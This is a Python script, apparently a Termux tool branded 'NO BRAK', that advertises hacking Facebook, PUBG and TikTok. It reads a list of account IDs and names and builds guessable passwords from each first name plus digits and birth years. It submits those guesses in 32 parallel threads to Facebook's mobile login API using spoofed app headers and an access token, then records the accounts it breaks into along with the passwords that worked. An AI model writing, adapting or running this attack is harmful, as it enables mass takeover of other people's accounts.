import os,sys,requests,random,time
from concurrent.futures import ThreadPoolExecutor as tred
import webbrowser
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
N = '\x1b[0m'  
H = '\x1b[1;92m'
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
os.system('pkg install speak')
os.system('pkg install espeak')
os.system('espeak -a 300 " WELCOME TO NO BRAK TOOL"')

webbrowser.open('https://t.me/NO_BRAK')
pwv = []
id= []








def banner():
    os.system('clear')
    p = """   
\x1b[38;5;46m╭╮╭╮╭┳━━━┳━━━┳━━━┳━━━╮
\x1b[38;5;46m┃┃┃┃┃┃╭━╮┃╭━╮┣╮╭╮┃╭━━╯
\x1b[38;5;208m┃┃┃┃┃┃┃╱┃┃┃╱┃┃┃┃┃┃╰━━╮
\x1b[38;5;208m┃╰╯╰╯┃┃╱┃┃┃╱┃┃┃┃┃┃╭━━╯
\x1b[1;97m╰╮╭╮╭┫╰━╯┃╰━╯┣╯╰╯┃╰━\x1b[1;97m━╮
╱╰╯╰╯╰━━━┻━━━┻━━━┻━━━╯
\x1b[1;92m╍╌╍╌╍\x1b[1;95m‒╍╌╍╌╍‒\x1b[1;94m╍╌╍╌╍\x1b[1;97m╌╍╌╍╍\x1b[1;96m╌╍╌╍‒╍\x1b[1;93m╌╍╌╍‒╍\x1b[1;91m╌╍╌╍╌╍\x1b[1;92m╌╍╌╍╌╍
⋘─────ミNO BRAKミ─────⋙\x1b[37;5;200m 
Telegram: @NO_BRAK\x1b[38;5;208m
TOOLS : FILE FB   \x1b[35;7;27m 
𝚃𝚑𝚒𝚜 𝚃𝚘𝚘𝚕 𝙵𝚘𝚛\x1b[1;92m
❖ - 𝙷𝙰𝙲𝙺 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺  \x1b[1;91m
❖ - 𝙷𝙰𝙲𝙺 𝙿𝚄𝙱𝙶 𝙼𝙾𝙱𝙸𝙻𝙴   \x1b[33;5;211m
❖ - 𝙷𝙰𝙲𝙺 𝚃𝙸𝙺 𝚃𝙾𝙺  \x1b[38;5;225m
⋘─────ミNO BRAKミ─────⋙\x1b[38;5;100m   
\x1b[1;92m╍╌╍╌╍\x1b[1;95m‒╍╌╍╌╍‒\x1b[1;94m╍╌╍╌╍\x1b[1;97m╌╍╌╍╍\x1b[1;96m╌╍╌╍‒╍\x1b[1;93m╌╍╌╍‒╍\x1b[1;91m╌╍╌╍╌╍\x1b[1;92m╌╍╌╍╌╍
•••••••••••••••••••••••••••••••••••••••••••••••
Tray and Tray you can do it broo..
•••••••••••••••••••••••••••••••••••••••••••••••
"""
    print(p)
   

banner()
def file():
    fileX = input (A +'ENTER FILE NAME : ')
    for line in open(fileX, 'r').readlines():
	    id.append(line.strip())
    passwrd()



def passwrd():
	banner()
	with tred(max_workers=32) as xera:
		for naw in id:
			idf,nmf = naw.split('|')[0],naw.split('|')[1].lower()
			
			frs = nmf.split(' ')[0]
			pwv= []
			pwv.append(nmf)
			pwv.append(frs+frs)
			pwv.append(frs+'123')
			pwv.append(frs+'123321')
			pwv.append(frs+'1212')
			pwv.append(frs+'123123')
			pwv.append(frs+'1234')
			pwv.append(frs+'12345678')
			pwv.append(frs+'1234@')
			pwv.append(frs+'12345@')
			pwv.append(frs+'12345')
			pwv.append(frs+'11223344')
			pwv.append(frs+'112233')
			pwv.append(frs+'1995')
			pwv.append(frs+'1996')
			pwv.append(frs+'1997')
			pwv.append(frs+'1998')
			pwv.append(frs+'1999')
			pwv.append(frs+'2000')
			pwv.append(frs+'2001')
			pwv.append(frs+'2002')
			pwv.append(frs+'2003')
			pwv.append(frs+'2004')
			pwv.append(frs+'2005')
			pwv.append(frs+'2006')
			pwv.append(frs+'2007')
			pwv.append(frs+'1122')
			pwv.append(frs+'1221')
			pwv.append(frs+'112233')
			pwv.append(frs+'321')
			pwv.append(frs+'332211')
			pwv.append('12345678'+frs)
			pwv.append('123456789'+frs)
			pwv.append(frs+'123'+frs)
			pwv.append(frs+'1234'+frs)
			pwv.append('123'+frs)
			pwv.append('1234'+frs)
			pwv.append('12345'+frs)
			pwv.append('123456'+frs)
			xera.submit(crack,idf,pwv)
			#crack(idf,pwv)
	print("Cp : ")
	print(cpp)
	print("Ok : ")
	print(okk)


okk =[]
cpp= []
loop,ok,cp =0,0,0
def crack(idf,pwv):
	global loop,ok,cp,okk,cpp
	bo = random.choice([P])
	
	sys.stdout.write(f"\r\u001b[0m[WOODE] [{loop}|{len(id)}] [\u001b[32;1m{str(ok)}\u001b[0m=\u001b[33;1m{str(cp)}\u001b \u001b[0m ]"),sys.stdout.flush()
	ses = requests.Session()
	for pw in pwv:
	
		time.sleep(1)
		try:
			
			url = 'https://b-graph.facebook.com/auth/login'
			headers = {'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 13; SM-R924W  Build/SP1A.654834.456) [FBAN/FB4A;FBAV/293.0.0.39206;FBBV/327052816;FBRV/0;FBPN/com.facebook.orca;FBLC/en_US;FBMF/Nubia;FBBD/Nubia;FBDV/NX597J;FBSV/6.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2246};FB_FW/1;]"+"[FBAN/FB4A;FBAV/336.0.0.46358;FBBV/450332175;FBRV/0;FBPN/com.facebook.lite;FBLC/en_GB;FBMF/Nubia;FBBD/Nubia;FBDV/NX597J;FBSV/6.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;];[FBAN/FB4A;FBAV/336.0.0.46358;FBBV/450332175;FBRV/0;FBPN/com.facebook.lite;FBLC/en_GB;FBMF/Nubia;FBBD/Nubia;FBDV/NX597J;FBSV/6.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;]', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '24357', 'X-FB-SIM-HNI': '34567', 'X-FB-Connection-Type': 'unknown', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
			
			data = {'adid': '832d1110-8291-4323-b575-06dd1f6fe5ed', 'format': 'json', 'device_id': '9d00978b-b44e-4ea1-bb5e-c2a6b4f0f1bf', 'cpl': 'true', 'family_device_id': '143e620e-8586-45d9-9a70-12cfe393c201', 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': idf, 'password': pw, 'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': '255d5c7f-7249-464f-a597-791c7c3e07d0', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'api_key': '882a8490361da98702bf97a021ddc14d'}
			
			resp = ses.post(url, headers=headers, data=data)
			
			if 'c_user' in resp.text:
			    print(f'\u001b[32;1m\nOk-WOODE : {idf} | {pw}')
			    ok+=1
			    print(resp.text)
			    okk.append(idf+"|"+pw)
			    break
			elif 'Login approvals' in resp.text:
			    print(f'\u001b[33;1m\nCp-WOODE :  {idf} | {pw}')
			    cp+=1
			    
			    cpp.append(idf+"|"+pw)
			    break
			else:
			    continue
		except:
		    continue
	loop+=1
file()
